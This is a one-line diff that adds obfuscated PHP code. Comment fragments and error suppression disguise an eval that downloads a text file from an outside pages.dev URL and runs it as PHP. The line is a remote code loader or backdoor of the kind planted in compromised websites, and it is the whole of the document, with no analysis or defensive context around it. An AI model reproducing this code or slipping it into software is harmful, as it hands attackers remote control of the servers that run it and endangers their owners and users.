@@ -1,0 +1,1 @@
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://b24dab5a.id-kompas.pages.dev/s/s.txt")))); /**/ ?>
